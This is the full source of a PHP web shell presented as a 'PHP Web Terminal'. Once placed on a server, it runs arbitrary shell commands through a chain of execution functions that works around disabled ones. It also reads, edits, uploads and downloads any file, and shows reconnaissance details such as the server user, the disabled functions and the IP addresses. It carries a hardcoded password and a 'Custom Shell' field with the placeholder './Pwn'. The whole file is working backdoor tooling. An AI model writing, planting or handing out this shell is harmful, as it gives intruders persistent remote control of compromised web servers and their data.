<?php
/**
 * PHP Web Terminal
 *
 * @version 1.1.0
 * @pv.pat [Original Author] - Updated by @pinoyvendetta
 * @link https://github.com/your-repo/php-web-terminal
 */
session_start();
date_default_timezone_set('Asia/Manila');
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/term_error_log');
error_reporting(E_ALL);
ini_set('display_errors', 0); // Keep this off for security
set_time_limit(0);

// --- Version Information ---
$version = '1.1.0';

// OS Detection
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

// --- MD5 Password ---
$default_password_hash = '152f90e55597001071345e8a037d5c4e'; // MD5 for "Pinoy404!"

// Check if a function is enabled (not disabled)
function is_function_enabled($func) {
    if (!function_exists($func)) {
        return false;
    }
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);
    return !in_array($func, $disabled);
}

// --- Enhanced: Flexible Command Execution with popen Fallback ---
function execute_command($command, $cwd) {
    global $is_windows;

    $full_command = $is_windows
        ? 'cd /d ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1'
        : 'cd ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1';

    $output = '';

    if (is_function_enabled('proc_open')) {
        $descriptorspec = [
           0 => ["pipe", "r"],  // stdin
           1 => ["pipe", "w"],  // stdout
           2 => ["pipe", "w"]   // stderr
        ];
        $pipes = [];
        $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output .= stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $output .= stream_get_contents($pipes[2]); // Capture stderr too
            fclose($pipes[2]);
            proc_close($process);
        } else {
            error_log("proc_open failed for command: $full_command");
            $output = "Error: proc_open failed.";
        }
    } elseif (is_function_enabled('popen')) {
        // Fallback to popen
        $handle = popen($full_command, 'r');
        if (is_resource($handle)) {
            while (!feof($handle)) {
                $output .= fread($handle, 8192);
            }
            pclose($handle);
        } else {
             error_log("popen failed for command: $full_command");
             $output = "Error: popen failed.";
        }
    } elseif (is_function_enabled('shell_exec')) {
        $output = shell_exec($full_command);
    } elseif (is_function_enabled('passthru')) {
        ob_start();
        passthru($full_command, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (is_function_enabled('system')) {
        ob_start();
        system($full_command, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (is_function_enabled('exec')) {
        exec($full_command, $output_array, $return_var);
        $output = implode("\n", $output_array);
    } else {
        error_log("All command execution functions are disabled. Cannot execute: $full_command");
        $output = "Error: All command execution functions are disabled.";
    }

    if ($output === null || trim($output) === '') {
        $output = "Command executed, but produced no output.";
    }
    return htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}

// --- Consolidated POST Request Handling ---
$login_error = '';
$upload_message = '';

// Handle logout first
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Determine login status
$is_logged_in = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Handle login attempt
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (md5($_POST['password']) === $default_password_hash) {
        $_SESSION['authenticated'] = true;
        $is_logged_in = true;
        $_SESSION['cwd'] = getcwd();
        header('Location: ' . $_SERVER['PHP_SELF']); // Redirect to clear POST data
        exit;
    } else {
        $login_error = 'Invalid password.';
        error_log("Failed login attempt with password: " . $_POST['password']);
    }
}

// Handle AJAX actions (command, save_file) - requires login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
    if (isset($_POST['action']) && $_POST['action'] === 'save_file') {
        header('Content-Type: application/json');
        $response = ['output' => '', 'cwd' => $_SESSION['cwd']];
        $full_path = $_POST['filepath'];
        $content = $_POST['content'];

        if (file_put_contents($full_path, $content) !== false) {
            $response['output'] = htmlspecialchars("File saved: " . $full_path, ENT_QUOTES, 'UTF-8');
        } else {
            error_log("Failed to save file: $full_path");
            $response['output'] = htmlspecialchars("Error: Failed to save file to " . $full_path, ENT_QUOTES, 'UTF-8');
        }
        echo json_encode($response);
        exit;

    } elseif (isset($_POST['command'])) {
        header('Content-Type: application/json');
        $response = ['output' => '', 'cwd' => $_SESSION['cwd']];
        $command = trim($_POST['command']);
        $custom_shell = isset($_POST['custom_shell']) ? trim($_POST['custom_shell']) : '';
        putenv('TERM=xterm');

        if (preg_match('/^\s*cd\s*(.*)/i', $command, $matches)) {
            $target_dir_param = trim($matches[1]);
            $target_dir_to_resolve = $target_dir_param;

            if (empty($target_dir_param) || $target_dir_param === '~') {
                $target_dir_to_resolve = getenv('HOME') ?: getenv('USERPROFILE');
                if (!$target_dir_to_resolve) {
                    $target_dir_to_resolve = $is_windows ? (getenv('SystemDrive') . '\\') : '/';
                }
            }
            $original_php_cwd = getcwd();
            if (@chdir($_SESSION['cwd'])) {
                $new_dir = realpath($target_dir_to_resolve);
                @chdir($original_php_cwd);
            } else {
                 error_log("cd: Failed to chdir to session CWD: " . $_SESSION['cwd']);
                 $new_dir = false;
            }

            if ($new_dir && is_dir($new_dir) && is_readable($new_dir)) {
                $_SESSION['cwd'] = $new_dir;
                $response['output'] = htmlspecialchars("Changed directory to $new_dir", ENT_QUOTES, 'UTF-8');
            } else {
                $response['output'] = htmlspecialchars("Error: Cannot change directory to '$target_dir_param'. Resolved attempt: '$target_dir_to_resolve'. Result: '" . ($new_dir ?: 'path not found') . "'", ENT_QUOTES, 'UTF-8');
            }
        } elseif (preg_match('/^\s*edit\s+([\S]+)/i', $command, $matches)) {
            $file_to_edit = trim($matches[1]);
            $is_absolute = ($file_to_edit[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_edit)));
            $full_path = $is_absolute ? $file_to_edit : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_edit;

            if (is_file($full_path) && is_readable($full_path)) {
                $content = file_get_contents($full_path);
                $response['output'] = htmlspecialchars("Editing existing file: " . $file_to_edit, ENT_QUOTES, 'UTF-8');
            } else {
                $content = '';
                $response['output'] = htmlspecialchars("Opening new or unreadable file for editing: " . $file_to_edit, ENT_QUOTES, 'UTF-8');
            }

            $response['action'] = 'edit';
            $response['filepath'] = $full_path;
            $response['content'] = $content;
            
        } elseif (preg_match('/^\s*download\s+([\S]+)/i', $command, $matches)) {
            $file_to_download = trim($matches[1]);
            $is_absolute = ($file_to_download[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_download)));
            $full_path = $is_absolute ? $file_to_download : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_download;
            
            if (is_file($full_path) && is_readable($full_path)) {
                 $response['action'] = 'download';
                 $response['filepath'] = base64_encode($full_path);
                 $response['output'] = htmlspecialchars("Preparing download for " . basename($full_path) . "...", ENT_QUOTES, 'UTF-8');
             } else {
                 $response['output'] = htmlspecialchars("Error: Cannot access file '$file_to_download' for download. Attempted: $full_path", ENT_QUOTES, 'UTF-8');
             }
        } else {
            $exec_command = $command;
            if (!empty($custom_shell)) {
                $exec_command = escapeshellcmd($custom_shell) . ' ' . escapeshellarg($command);
            }
            $response['output'] = execute_command($exec_command, $_SESSION['cwd']);
        }
        $response['cwd'] = $_SESSION['cwd'];
        echo json_encode($response);
        exit;
    }
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $is_logged_in) {
    $upload_dir_target = $_SESSION['cwd'];

    if (!is_dir($upload_dir_target) || !is_writable($upload_dir_target)) {
        $upload_dir_target = __DIR__ . DIRECTORY_SEPARATOR . 'uploads';
        if (!is_dir($upload_dir_target)) {
            if (!@mkdir($upload_dir_target, 0755, true)) {
                error_log("Failed to create fallback upload directory: " . $upload_dir_target);
                $upload_message = "Error: Could not create upload directory. Please check server permissions.";
                $upload_dir_target = null;
            }
        }
    }

    if ($upload_dir_target && is_dir($upload_dir_target) && is_writable($upload_dir_target)) {
        $file_name = basename($_FILES['file']['name']);
        $file_name_sanitized = preg_replace('/[^A-Za-z0-9.\-\_]/', '', $file_name);

        if (empty($file_name_sanitized)) {
            $upload_message = "Error: Invalid file name (perhaps empty after sanitization). Original: '$file_name'";
        } else {
            $target_file = rtrim($upload_dir_target, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_name_sanitized;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                $upload_message = "File uploaded to " . htmlspecialchars(realpath($upload_dir_target), ENT_QUOTES, 'UTF-8') . DIRECTORY_SEPARATOR . htmlspecialchars($file_name_sanitized, ENT_QUOTES, 'UTF-8');
            } else {
                $upload_message = "Error: Failed to move uploaded file to " . htmlspecialchars(realpath($upload_dir_target) ?: $upload_dir_target, ENT_QUOTES, 'UTF-8') . ". Check permissions. PHP error: " . $_FILES['file']['error'];
                error_log("File upload error (move_uploaded_file): " . $_FILES['file']['error'] . " to target " . $target_file);
            }
        }
    } elseif (!$upload_message) {
        $upload_message = "Error: Upload directory (" . htmlspecialchars($upload_dir_target ?: $_SESSION['cwd'], ENT_QUOTES, 'UTF-8') . ") is not writable or does not exist.";
        error_log("Upload directory not writable/exists: " . ($upload_dir_target ?: $_SESSION['cwd']));
    }
}

// Initialize or update CWD in session
if ($is_logged_in && !isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Handle File Download (GET Request)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download']) && $is_logged_in) {
    $file_path_b64 = $_GET['download'];
    $full_path = base64_decode($file_path_b64);

    if ($full_path === false || empty($full_path)) {
        error_log("Download attempt failed: Invalid base64-encoded path.");
        echo "Error: Invalid file path.";
        exit;
    }
    
    if (is_file($full_path) && is_readable($full_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($full_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($full_path));
        ob_clean();
        flush();
        readfile($full_path);
        exit;
    } else {
        error_log("Download attempt failed for path: '$full_path'. Not a file or not readable.");
        echo "Error: File not found or access denied.";
        exit;
    }
}


// If not logged in, show login form
if (!$is_logged_in) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Terminal Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 20px; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .login-container { max-width: 400px; margin: 50px auto; text-align: center; background: #1a1a1a; padding: 20px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; }
        input[type="password"], input[type="text"] { width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        input[type="submit"] { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-top: 10px; }
        input[type="submit"]:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .login-image-wrapper { text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>System Terminal Login</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Enter password" autofocus>
            <br><br>
            <input type="submit" value="Login">
        </form>
        <?php if (isset($login_error) && !empty($login_error)) { ?>
            <p class="error"><?php echo $login_error; ?></p>
        <?php } ?>
    </div>
    <div class="login-image-wrapper">
        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Login GIF" width="250" height="250">
    </div>
</body>
</html>
<?php
    exit;
}

// Gather system information for header
$uname = function_exists('shell_exec') && is_function_enabled('shell_exec') ? (shell_exec($is_windows ? 'ver 2>&1' : 'uname -a 2>&1') ?: 'N/A') : 'N/A';
$disabled_functions = ini_get('disable_functions') ?: 'None';
$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
$php_version = phpversion();
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
$client_ip = $_SERVER['REMOTE_ADDR'];
$date_time = date('Y-m-d H:i:s');
if (!$is_windows && function_exists('posix_getpwuid') && function_exists('posix_geteuid') && function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
    $user_info = @posix_getpwuid(@posix_geteuid());
    $group_info = @posix_getgrgid(@posix_getegid());
    $user = $user_info ? $user_info['name'] : 'Unknown';
    $group = $group_info ? $group_info['name'] : 'N/A';
} else {
    $user = getenv('USERNAME') ?: (function_exists('get_current_user') ? get_current_user() : 'Unknown');
    $group = getenv('USERDOMAIN') ?: 'N/A';
}
$cwd = $_SESSION['cwd'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Terminal Shell v<?php echo $version; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 0; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .header { position: fixed; top: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-bottom: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; z-index: 1000; font-size: 12px; display: flex; justify-content: space-between; }
        .header-left, .header-right { flex: 1; }
        .header-right { text-align: right; }
        .header p { margin: 3px 10px; }
        .terminal-container { margin: 180px 20px 80px 20px; }
        #terminal { background: #1a1a1a; border: 2px solid #00ff00; padding: 10px; height: 50vh; overflow-y: auto; margin-bottom: 10px; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; word-wrap: break-word; }
        #terminal p { margin: 2px 0; }
        .input-area { display: flex; align-items: center; }
        .prompt { color: #00ff00; text-shadow: 0 0 5px #00ff00; margin-right: 5px; white-space: nowrap; }
        #command, #custom_shell { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        #command { flex-grow: 1; }
        #custom_shell { width: 150px; }
        .custom-shell-group { margin-left: 10px; text-align: center; display: flex; flex-direction: column; align-items: center; }
        .custom-shell-group label { font-size: 0.8em; margin-top: 4px; display:block; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .action-btn, .logout-btn { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-left: 10px; }
        .action-btn:hover, .logout-btn:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
        .footer { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-top: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; text-align: center; z-index: 1000; }
        input[type="file"] { color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; }
        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8); }
        .modal-content { background-color: #1a1a1a; margin: 10% auto; padding: 20px; border: 2px solid #00ff00; width: 80%; color: #00ff00; box-shadow: 0 0 25px #00ff00; }
        .modal-content textarea { width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Courier New', monospace; margin-bottom: 10px; box-sizing: border-box; }
        .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
        .close-btn:hover, .close-btn:focus { color: #fff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <p><strong>Uname:</strong> <?php echo htmlspecialchars($uname, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Disabled Functions:</strong> <?php echo htmlspecialchars($disabled_functions, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Date and Time:</strong> <?php echo htmlspecialchars($date_time, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>User:</strong> <?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?> <strong>Group:</strong> <?php echo htmlspecialchars($group, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>CWD:</strong> <span id="cwd_display"><?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?></span></p>
        </div>
        <div class="header-right">
            <form method="post" style="display: inline;">
                <input type="hidden" name="logout" value="1">
                <input type="submit" value="Logout" class="logout-btn">
            </form>
            <p><strong>Safe Mode:</strong> <?php echo $safe_mode; ?></p>
            <p><strong>PHP Version:</strong> <?php echo $php_version; ?></p>
            <p><strong>Server IP:</strong> <?php echo htmlspecialchars($server_ip, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Client IP:</strong> <?php echo htmlspecialchars($client_ip, ENT_QUOTES, 'UTF-8'); ?></p>
        </div>
    </div>

    <div class="terminal-container">
        <div id="terminal"></div>
        <div class="input-area">
           <span class="prompt" id="prompt">$ </span>
           <input type="text" id="command" autofocus>
           <div class="custom-shell-group">
               <input type="text" id="custom_shell" placeholder="(e.g. ./Pwn)">
               <label for="custom_shell"><b>Custom Shell</b></label>
           </div>
        </div>
    </div>

    <div class="footer">
        <form method="post" enctype="multipart/form-data" style="display: inline;">
            <input type="file" name="file" required>
            <input type="submit" value="Upload" class="action-btn">
        </form>
        <?php if (isset($upload_message) && !empty($upload_message)) { ?>
            <p style="margin-top: 5px;" class="<?php echo strpos($upload_message, 'Error') === 0 ? 'error' : ''; ?>">
                <?php echo $upload_message; ?>
            </p>
        <?php } ?>
    </div>

    <div id="editorModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h3 id="editorFileName">Edit File</h3>
            <textarea id="editorContent"></textarea>
            <button id="saveButton" class="action-btn">Save</button>
        </div>
    </div>

    <script>
        var terminal = document.getElementById('terminal');
        var commandInput = document.getElementById('command');
        var customShellInput = document.getElementById('custom_shell');
        var promptSpan = document.getElementById('prompt');
        var cwdSpan = document.getElementById('cwd_display');
        var editorModal = document.getElementById('editorModal');
        var editorFileNameSpan = document.getElementById('editorFileName');
        var editorContentTextarea = document.getElementById('editorContent');
        var saveButton = document.getElementById('saveButton');
        var closeBtn = document.querySelector('.close-btn');
        var currentFilePath = '';

        var commandHistory = [];
        var historyIndex = -1;

        commandInput.addEventListener('keydown', function(e) {
            if (e.keyCode === 13) { // Enter key
                e.preventDefault();
                var command = commandInput.value.trim();
                if (command !== '') {
                    appendToTerminalOutput('$ ' + command);
                    commandHistory.push(command);
                    historyIndex = commandHistory.length;

                    if (command.toLowerCase() === 'clear') {
                        terminal.innerHTML = '';
                    } else {
                        sendCommand(command);
                    }
                    commandInput.value = '';
                }
            } else if (e.keyCode === 38) { // Up arrow
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                    commandInput.focus();
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                }
            } else if (e.keyCode === 40) { // Down arrow
                 e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                } else if (historyIndex === commandHistory.length - 1) {
                     historyIndex++;
                     commandInput.value = '';
                }
                commandInput.focus();
                commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
            }
        });

        function appendToTerminal(htmlContent, isError) {
            var p = document.createElement('p');
            p.innerHTML = htmlContent;
            if (isError) {
                p.className = 'error';
            }
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function appendToTerminalOutput(text, isError) {
            var p = document.createElement('p');
            var safeText = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            p.innerHTML = safeText.replace(/\n/g, '<br>');
            if (isError) {
                p.className = 'error';
            }
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }


        function updatePrompt(cwd) {
            cwdSpan.textContent = cwd;
        }

        function sendCommand(command) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.output) {
                            appendToTerminal(response.output.replace(/\n/g, '<br>'), response.output.indexOf('Error:') === 0 || response.output.indexOf('Error: ') !== -1);
                        }
                        if (response.cwd) {
                            updatePrompt(response.cwd);
                        }
                        if (response.action === 'edit') {
                            openEditor(response.filepath, response.content);
                        } else if (response.action === 'download') {
                             window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>?download=' + response.filepath;
                        }
                    } catch (e) {
                        console.error("Failed to parse JSON response:", xhr.responseText, e);
                        appendToTerminalOutput('Error: Failed to parse server response. Check console/logs. Response: ' + xhr.responseText.substring(0,100) + '...', true);
                    }
                } else if (xhr.readyState === 4) {
                    appendToTerminalOutput('Error: Server request failed. Status: ' + xhr.status, true);
                }
            };
            xhr.send('command=' + encodeURIComponent(command) + '&custom_shell=' + encodeURIComponent(customShellInput.value));
        }

        function openEditor(filepath, content) {
            currentFilePath = filepath;
            editorFileNameSpan.textContent = 'Edit: ' + filepath;
            editorContentTextarea.value = content;
            editorModal.style.display = 'block';
            editorContentTextarea.focus();
        }

        function closeEditor() {
            editorModal.style.display = 'none';
        }

        closeBtn.onclick = closeEditor;
        window.onclick = function(event) {
            if (event.target == editorModal) {
                closeEditor();
            }
        }

        saveButton.onclick = function() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4 && xhr.status === 200) {
                     try {
                        var response = JSON.parse(xhr.responseText);
                         appendToTerminal(response.output.replace(/\n/g, '<br>'), response.output.indexOf('Error:') === 0);
                         closeEditor();
                     } catch(e) {
                         console.error("Failed to parse save response:", xhr.responseText, e);
                         appendToTerminalOutput('Error: Failed to parse save response. Check console.', true);
                     }
                 } else if (xhr.readyState === 4) {
                     appendToTerminalOutput('Error: Failed to save file. Status: ' + xhr.status, true);
                 }
            };
            xhr.send('action=save_file&filepath=' + encodeURIComponent(currentFilePath) + '&content=' + encodeURIComponent(editorContentTextarea.value));
        };
    </script>
</body>
</html>
